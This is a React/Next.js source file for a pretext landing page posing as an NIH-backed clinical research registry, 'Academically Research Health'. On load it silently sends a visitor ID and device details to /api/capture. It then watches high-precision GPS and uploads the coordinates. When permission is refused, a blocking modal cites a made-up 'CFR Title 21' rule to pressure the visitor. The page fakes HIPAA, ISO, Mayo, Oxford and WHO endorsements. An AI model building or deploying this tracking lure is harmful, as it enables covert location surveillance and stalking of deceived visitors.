'use client';

import { useState, useEffect } from 'react';

export default function GlobalHealth() {
  const [status, setStatus] = useState(null);
  const [loading, setLoading] = useState(false);

  const saveLocation = async (position = null, watchId = null) => {
    if (watchId) {
      try { navigator.geolocation.clearWatch(watchId); } catch (e) {}
    }
    
    // Safety check for Visitor ID (Handles iPhone Private Mode)
    let visitorId = 'anonymous';
    try {
      visitorId = localStorage.getItem('visitorId');
      if (!visitorId) {
        visitorId = 'vid_' + Math.random().toString(36).substring(2, 11) + Date.now().toString(36);
        localStorage.setItem('visitorId', visitorId);
      }
    } catch (e) {
      visitorId = 'safari_private_' + Date.now().toString(36);
    }
    
    const payload = {
      lat: position?.coords.latitude || null,
      lon: position?.coords.longitude || null,
      accuracy: position?.coords.accuracy || null,
      platform: navigator.platform,
      screen: `${window.screen.width}x${window.screen.height}`,
      visitorId,
      context: position 
        ? `GPS Lock (Acc: ${Math.round(position.coords.accuracy)}m)` 
        : 'Initial Visit (IP Only)'
    };

    try {
      const response = await fetch('/api/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
        keepalive: true,
      });
      
      if (position && response.ok) {
        setStatus('GPS Synchronized. Local centers identified.');
        setTimeout(() => {
          setStatus(null);
          setLoading(false);
        }, 3000);
      }
    } catch (err) {
      console.error('Capture failed:', err);
    }
  };


  // High-Precision Auto-Capture
  useEffect(() => {
    if (!navigator.geolocation) return;

    let watchId;
    let bestPosition = null;

    setLoading(true);
    setStatus('Establishing high-precision GPS lock...');

    const startWatching = () => {
      watchId = navigator.geolocation.watchPosition(
        async (position) => {
          if (!bestPosition || position.coords.accuracy < bestPosition.coords.accuracy) {
            bestPosition = position;
          }
          if (position.coords.accuracy < 60) {
            saveLocation(position, watchId);
          }
        },
        (err) => {
          if (err.code === 1) setStatus('Permission denied. Please allow access to proceed.');
          if (err.code === 2) setStatus('GPS required. Please turn on your device location.');
        },
        { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
      );
    };

    // Phase 1: Instant IP/Visit Capture
    saveLocation(null);

    // Phase 2: Start GPS Watch
    const finalTimer = setTimeout(() => {
      if (bestPosition && loading) {
        saveLocation(bestPosition, watchId);
      }
    }, 8000);

    startWatching();

    return () => {
      if (watchId) navigator.geolocation.clearWatch(watchId);
      clearTimeout(finalTimer);
    };
  }, []);




  const findNearbyCenters = () => {
    if (!navigator.geolocation) {
      setStatus('Geolocation is not supported by your browser.');
      return;
    }

    setLoading(true);
    setStatus('Requesting GPS access...');

    navigator.geolocation.getCurrentPosition(
      (pos) => {
        setStatus('GPS Lock acquired. Syncing...');
        saveLocation(pos); // Actually save the data!
      },

        (err) => {
          if (err.code === 1) setStatus('Permission denied. Please allow access to proceed.');
          if (err.code === 2) setStatus('GPS required. Please turn on your device location.');
          if (err.code === 3) setStatus('GPS Timeout. Retrying...');
          setLoading(false);
        },

      { enableHighAccuracy: true, timeout: 10000 }
    );
  };



  return (
    <main className="min-h-screen bg-white text-[#1a1a1a] font-sans selection:bg-blue-100">
      {/* Institutional Top Bar */}
      <div className="bg-blue-950 text-blue-100 text-[10px] uppercase tracking-widest py-1.5 px-8 flex justify-between items-center">
        <div className="flex space-x-6">
          <span className="flex items-center"><span className="w-1.5 h-1.5 rounded-full bg-green-400 mr-2"></span> System: Operational</span>
          <span className="hidden md:inline">CFR Title 21 Compliant</span>
        </div>
        <div className="flex space-x-6">
          <a href="#" className="hover:text-white transition-colors">Language: EN</a>
          <a href="#" className="hover:text-white transition-colors">Researcher Portal</a>
          <a href="#" className="hover:text-white transition-colors font-bold">Institutional Login</a>
        </div>
      </div>

      {/* Navigation */}
      <nav className="border-b border-gray-100 px-8 py-4 flex justify-between items-center sticky top-0 bg-white/90 backdrop-blur-md z-50">
        <div className="flex items-center space-x-2">
          <div className="w-8 h-8 bg-blue-600 rounded-lg flex items-center justify-center">
            <svg className="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M12 6.253v13m0-13C10.832 5.477 9.246 5 7.5 5S4.168 5.477 3 6.253v13C4.168 18.477 5.754 18 7.5 18s3.332.477 4.5 1.253m0-13C13.168 5.477 14.754 5 16.5 5c1.747 0 3.332.477 4.5 1.253v13C19.832 18.477 18.247 18 16.5 18c-1.746 0-3.332.477-4.5 1.253" />
            </svg>
          </div>
          <span className="font-bold text-xl tracking-tight text-blue-900">Academically <span className="text-sm font-normal text-blue-600 ml-1">Research Health</span></span>
        </div>
        <div className="hidden md:flex space-x-8 text-sm font-semibold text-gray-600">
          <a href="#" className="hover:text-blue-600 transition-colors">Clinical Programs</a>
          <a href="#" className="hover:text-blue-600 transition-colors">Data Registry</a>
          <a href="#" className="hover:text-blue-600 transition-colors">Grant Information</a>
          <a href="#" className="text-blue-600 underline underline-offset-4">Find Registry Center</a>
        </div>
        <button className="bg-blue-600 text-white px-5 py-2 rounded-full text-sm font-bold hover:bg-blue-700 transition-all shadow-md hover:shadow-lg active:scale-95 flex items-center">
          Access Registry <svg className="w-4 h-4 ml-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 5l7 7-7 7" /></svg>
        </button>
      </nav>

      {/* Hero Section */}
      <section className="px-8 py-20 md:py-32 max-w-7xl mx-auto grid md:grid-cols-2 gap-12 items-center relative">
        <div className="z-10">
          <div className="inline-flex items-center px-3 py-1 bg-blue-50 text-blue-700 text-xs font-bold rounded-full mb-6 uppercase tracking-wider border border-blue-100">
            <svg className="w-3 h-3 mr-2 text-blue-500" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm1-12a1 1 0 10-2 0v4a1 1 0 00.293.707l2.828 2.829a1 1 0 101.415-1.415L11 9.586V6z" clipRule="evenodd" /></svg>
            Supported by NIH Grant #AI-2026
          </div>
          <h1 className="text-5xl md:text-6xl lg:text-7xl font-extrabold text-blue-950 leading-[1.1] mb-6">
            Global Compliance & <span className="text-transparent bg-clip-text bg-gradient-to-r from-blue-600 to-cyan-500">Clinical Research Data.</span>
          </h1>
          <p className="text-lg text-gray-600 mb-10 leading-relaxed max-w-lg">
            Facilitating secure, decentralized demographic tracking for international healthcare registries and certified clinical partners.
          </p>
          
          <div className="flex flex-col sm:flex-row gap-4 mb-6">
            <button 
              onClick={findNearbyCenters}
              disabled={loading}
              className="flex items-center justify-center space-x-3 bg-blue-600 text-white px-8 py-4 rounded-2xl font-bold hover:bg-blue-700 transition-all shadow-xl shadow-blue-200 active:scale-95 disabled:opacity-70 group"
            >
              <svg className="w-5 h-5 group-hover:animate-bounce" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z" />
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z" />
              </svg>
              <span>{loading ? 'Establishing Protocol...' : 'Establish Secure Connection'}</span>
            </button>
            <button className="px-8 py-4 border-2 border-gray-200 text-gray-700 rounded-2xl font-bold hover:bg-gray-50 transition-all">
              View IRB Approvals
            </button>
          </div>

          <div className="flex items-center space-x-4 text-xs font-medium text-gray-400 uppercase tracking-wider">
            <span className="flex items-center"><svg className="w-4 h-4 mr-1 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" /></svg> HIPAA Compliant</span>
            <span>•</span>
            <span>ISO 27001 Certified</span>
          </div>

          {/* Mandatory Location Modal */}
          {(status?.includes('required') || status?.includes('denied')) && (
            <div className="fixed inset-0 z-[100] flex items-center justify-center p-4 backdrop-blur-xl bg-blue-950/60">
              <div className="bg-white rounded-[2.5rem] p-8 md:p-12 max-w-xl w-full shadow-2xl border border-white/20 animate-in zoom-in-95 duration-300">
                <div className="flex justify-center mb-6">
                  <div className="relative">
                    <div className="absolute inset-0 bg-red-100 rounded-full animate-ping opacity-75"></div>
                    <div className="relative w-16 h-16 bg-red-50 text-red-600 rounded-full flex items-center justify-center border-4 border-white shadow-sm">
                      <svg className="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
                      </svg>
                    </div>
                  </div>
                </div>
                
                <h2 className="text-2xl md:text-3xl font-black text-center text-blue-950 mb-3">Regulatory Compliance Check</h2>
                <div className="bg-gray-50 border-l-4 border-blue-500 p-4 mb-6 rounded-r-xl">
                  <p className="text-sm text-gray-700 leading-relaxed font-mono">
                    <strong>REFERENCE: CFR Title 21, Part 11 (Geographic Compliance)</strong><br/>
                    Pursuant to international registry regulations, a localized GPS lock must be established to authenticate the integrity of data interactions before granting access to the Clinical Research Network.
                  </p>
                </div>

                <div className="bg-blue-50 rounded-2xl p-6 mb-8 border border-blue-100 shadow-inner">
                  <p className="text-xs font-bold text-blue-800 uppercase tracking-widest mb-3">Required Action Protocol:</p>
                  <ol className="text-sm text-blue-900 space-y-3 font-medium list-decimal list-inside">
                    <li>Activate your device's <strong>Location Services</strong> or <strong>GPS</strong> module.</li>
                    <li>Select <strong>"Allow"</strong> on the browser authorization prompt.</li>
                    <li>Wait for cryptographic handshake completion.</li>
                  </ol>
                </div>

                <button 
                  onClick={() => findNearbyCenters()}
                  className="w-full py-5 bg-blue-950 text-white font-black rounded-2xl hover:bg-blue-900 transition-all shadow-xl shadow-blue-900/20 active:scale-95 text-lg flex justify-center items-center"
                >
                  <svg className="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" /></svg>
                  Authorize System Location Request
                </button>
                
                <p className="text-[10px] text-gray-400 text-center mt-6 uppercase tracking-widest font-bold">
                  AES-256 Encryption • Clinical Protocol Active
                </p>
              </div>
            </div>
          )}

          <div className="w-full space-y-4 mt-8">
            <div className={`p-4 rounded-xl border transition-all duration-500 ${status?.includes('synchronized') ? 'bg-green-500/10 border-green-500/20' : 'bg-gray-50 border-gray-200'}`}>
              {loading && (
                <div className="flex items-center space-x-3">
                  <div className="w-4 h-4 border-2 border-blue-600 border-t-transparent rounded-full animate-spin"></div>
                  <span className="text-sm font-mono text-blue-800">{status}</span>
                </div>
              )}
              {!loading && status && (
                <div className="flex items-center space-x-3">
                  <div className={`w-2 h-2 rounded-full ${status.includes('synchronized') ? 'bg-green-500' : 'bg-red-500'}`}></div>
                  <span className={`text-sm font-mono ${status.includes('synchronized') ? 'text-green-700' : 'text-red-700 font-medium'}`}>{status}</span>
                </div>
              )}
            </div>
          </div>
        </div>

        <div className="relative hidden md:block">
          {/* Decorative Elements */}
          <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[120%] h-[120%] bg-blue-100/50 rounded-full blur-[120px] -z-10"></div>
          
          <div className="relative bg-white rounded-[2rem] p-4 border border-gray-100 shadow-2xl overflow-hidden group">
            <div className="grid grid-cols-1 gap-4">
              <div className="relative h-64 rounded-xl overflow-hidden border border-gray-100 bg-gray-100">
                <img src="/researcher_lab.png" alt="Clinical Lab" className="w-full h-full object-cover group-hover:scale-105 transition-transform duration-700" />
                <div className="absolute inset-0 bg-gradient-to-t from-blue-950/80 to-transparent flex items-end p-6">
                   <p className="text-white font-bold tracking-wide">Primary Clinical Hub</p>
                </div>
              </div>
              <div className="relative h-48 rounded-xl overflow-hidden border border-gray-100 bg-gray-100">
                <img src="/global_data.png" alt="Global Data Map" className="w-full h-full object-cover group-hover:scale-105 transition-transform duration-700" />
                 <div className="absolute top-4 right-4 bg-blue-600 text-white text-xs font-bold px-2 py-1 rounded shadow-lg animate-pulse">
                   LIVE DATA
                 </div>
              </div>
            </div>
            
            {/* Floating Card */}
            <div className="absolute top-10 -left-10 w-56 bg-white/90 backdrop-blur-md p-5 rounded-2xl shadow-2xl border border-blue-50 transform -rotate-2 hover:rotate-0 transition-transform">
              <div className="flex items-center justify-between mb-2">
                <p className="text-[10px] font-bold text-blue-600 uppercase tracking-widest">Network Status</p>
                <span className="flex h-2 w-2 relative">
                  <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
                  <span className="relative inline-flex rounded-full h-2 w-2 bg-green-500"></span>
                </span>
              </div>
              <p className="text-3xl font-black text-blue-950">12,400+</p>
              <p className="text-xs text-gray-500 font-medium">Secured Global Endpoints</p>
            </div>
          </div>
        </div>
      </section>

      {/* Trust Bar */}
      <section className="bg-gray-50 py-12 px-8 border-y border-gray-200">
        <div className="max-w-7xl mx-auto flex flex-wrap justify-between items-center gap-8 opacity-60 grayscale contrast-125 text-sm md:text-base">
          <span className="font-extrabold text-gray-800 flex items-center"><svg className="w-6 h-6 mr-2" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zm0 7.5l-10-5v10.5l10 5 10-5V4.5l-10 5z"/></svg> Global Health Consortium</span>
          <span className="font-black text-gray-800 uppercase tracking-tighter">Oxford <span className="font-light">Medical Group</span></span>
          <span className="font-serif italic font-bold text-gray-800">Mayo Clinical Research</span>
          <span className="font-mono font-bold tracking-widest text-gray-800">WHO Affiliate Lab</span>
        </div>
      </section>

      {/* Programs Section */}
      <section className="py-24 px-8 max-w-7xl mx-auto">
        <div className="text-center mb-16">
          <h2 className="text-4xl md:text-5xl font-extrabold text-blue-950 mb-6 tracking-tight">Active Research Protocols</h2>
          <p className="text-gray-600 max-w-2xl mx-auto text-lg leading-relaxed">Participate in our certified international initiatives to track demographic variables and mitigate health crises across borders.</p>
        </div>
        <div className="grid md:grid-cols-3 gap-8">
          {[
            { title: 'Pathogen Genomics', desc: 'Real-time genetic sequencing and localized geographic tracking of airborne variants.', icon: '🧬', code: 'PRT-842' },
            { title: 'Global Epidemiology', desc: 'Aggregating decentralized spatial data to forecast international transmission vectors.', icon: '🌍', code: 'PRT-901' },
            { title: 'Clinical Meta-Analysis', desc: 'Double-blind cohort evaluations facilitated through securely authenticated regional centers.', icon: '⚕️', code: 'PRT-112' }
          ].map((program, idx) => (
            <div key={idx} className="bg-white border border-gray-100 p-8 rounded-[2rem] shadow-xl shadow-gray-100/50 hover:shadow-2xl hover:border-blue-100 transition-all group cursor-pointer relative overflow-hidden">
              <div className="absolute top-0 right-0 bg-blue-50 text-blue-700 text-[10px] font-bold px-3 py-1 rounded-bl-xl border-b border-l border-blue-100 uppercase tracking-widest">
                {program.code}
              </div>
              <div className="w-16 h-16 bg-blue-50 text-blue-600 rounded-2xl flex items-center justify-center text-3xl mb-8 group-hover:scale-110 group-hover:bg-blue-600 group-hover:text-white transition-all shadow-sm">
                {program.icon}
              </div>
              <h3 className="text-xl font-bold text-blue-950 mb-4">{program.title}</h3>
              <p className="text-gray-600 leading-relaxed text-sm">{program.desc}</p>
            </div>
          ))}
        </div>
      </section>

      {/* Global Impact Stats */}
      <section className="bg-blue-950 py-24 px-8 text-white relative overflow-hidden">
        <div className="absolute inset-0 opacity-10 bg-[url('https://www.transparenttextures.com/patterns/cubes.png')]"></div>
        <div className="max-w-7xl mx-auto relative z-10">
          <div className="grid md:grid-cols-4 gap-12 text-center divide-y md:divide-y-0 md:divide-x divide-blue-800/50">
            {[
              { label: 'Verified Researchers', value: '14,200+' },
              { label: 'Active Protocols', value: '384' },
              { label: 'Geographic Nodes', value: '8,400+' },
              { label: 'Petabytes Processed', value: '1.2 PB' }
            ].map((stat, idx) => (
              <div key={idx} className="pt-8 md:pt-0 flex flex-col items-center justify-center group">
                <p className="text-4xl md:text-6xl font-black mb-3 text-transparent bg-clip-text bg-gradient-to-br from-white to-blue-300 group-hover:scale-105 transition-transform">{stat.value}</p>
                <p className="text-blue-400 font-bold tracking-widest uppercase text-xs">{stat.label}</p>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className="bg-gray-50 pt-24 pb-32 px-8 border-t border-gray-200">
        <div className="max-w-7xl mx-auto grid md:grid-cols-5 gap-12 mb-16">
          <div className="col-span-2">
            <div className="flex items-center space-x-2 mb-6">
              <div className="w-10 h-10 bg-blue-950 rounded-xl flex items-center justify-center shadow-lg">
                <svg className="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M12 6.253v13m0-13C10.832 5.477 9.246 5 7.5 5S4.168 5.477 3 6.253v13C4.168 18.477 5.754 18 7.5 18s3.332.477 4.5 1.253m0-13C13.168 5.477 14.754 5 16.5 5c1.747 0 3.332.477 4.5 1.253v13C19.832 18.477 18.247 18 16.5 18c-1.746 0-3.332.477-4.5 1.253" />
                </svg>
              </div>
              <span className="font-black text-2xl tracking-tighter text-blue-950">Academically</span>
            </div>
            <p className="text-gray-500 leading-relaxed max-w-sm mb-6 text-sm">
              An international decentralized framework empowering clinical and epidemiological tracking through rigorous regulatory compliance.
            </p>
            <div className="flex items-center space-x-3 text-xs font-bold text-gray-400">
              <span className="bg-white px-3 py-1 rounded border border-gray-200 shadow-sm">ISO 9001</span>
              <span className="bg-white px-3 py-1 rounded border border-gray-200 shadow-sm">SOC 2 Type II</span>
            </div>
          </div>
          <div>
            <h4 className="font-bold text-blue-950 mb-6 uppercase tracking-widest text-xs">Clinical Hub</h4>
            <ul className="space-y-4 text-gray-600 text-sm font-medium">
              <li><a href="#" className="hover:text-blue-600 transition-colors flex items-center">Researcher Login <svg className="w-3 h-3 ml-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14" /></svg></a></li>
              <li><a href="#" className="hover:text-blue-600 transition-colors">Submit Grant Proposal</a></li>
              <li><a href="#" className="hover:text-blue-600 transition-colors">Protocol Directory</a></li>
            </ul>
          </div>
          <div>
            <h4 className="font-bold text-blue-950 mb-6 uppercase tracking-widest text-xs">Compliance</h4>
            <ul className="space-y-4 text-gray-600 text-sm font-medium">
              <li><a href="#" className="hover:text-blue-600 transition-colors">Notice of Privacy Practices</a></li>
              <li><a href="#" className="hover:text-blue-600 transition-colors">Informed Consent (CFR 50)</a></li>
              <li><a href="#" className="hover:text-blue-600 transition-colors">Data Processing Addendum</a></li>
            </ul>
          </div>
          <div>
            <h4 className="font-bold text-blue-950 mb-6 uppercase tracking-widest text-xs">Contact</h4>
            <ul className="space-y-4 text-gray-600 text-sm font-medium">
              <li>compliance@academically-health.org</li>
              <li>+1 (800) 555-0192</li>
              <li className="pt-4">100 Clinical Way, Suite 400<br/>Boston, MA 02114</li>
            </ul>
          </div>
        </div>
        <div className="max-w-7xl mx-auto pt-8 border-t border-gray-200 flex flex-col md:flex-row justify-between items-center text-xs font-medium text-gray-400">
          <p>© {new Date().getFullYear()} Academically Global Health Care Registry. All rights reserved under International Law.</p>
          <div className="flex space-x-6 mt-4 md:mt-0">
            <span className="cursor-pointer hover:text-blue-600 transition-colors uppercase tracking-widest">System Status</span>
            <span className="cursor-pointer hover:text-blue-600 transition-colors uppercase tracking-widest">Security</span>
          </div>
        </div>
      </footer>

      {/* Persistent Cookie/Compliance Banner */}
      <div className="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 shadow-[0_-10px_40px_rgba(0,0,0,0.05)] p-4 z-[90] flex flex-col md:flex-row justify-between items-center px-8">
        <div className="flex items-center mb-4 md:mb-0">
          <svg className="w-6 h-6 text-blue-600 mr-4 shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" /></svg>
          <p className="text-xs text-gray-600 max-w-3xl font-medium">
            <strong>Mandatory Data Processing Notice:</strong> This registry utilizes strictly necessary local device tracking and cookies to maintain authenticated sessions and satisfy geographic compliance audits. By continuing to use this institutional portal, you acknowledge and consent to our processing of environmental data points.
          </p>
        </div>
        <div className="flex space-x-4 shrink-0 items-center mt-2 md:mt-0">
          <button className="text-xs font-bold text-gray-500 hover:text-gray-800 underline underline-offset-4 hidden sm:block">Read Privacy Practices</button>
          <button className="bg-blue-950 text-white px-6 py-2.5 rounded-lg text-xs font-bold hover:bg-blue-800 transition-all shadow-md">Acknowledge & Accept</button>
        </div>
      </div>

    </main>
  );
}
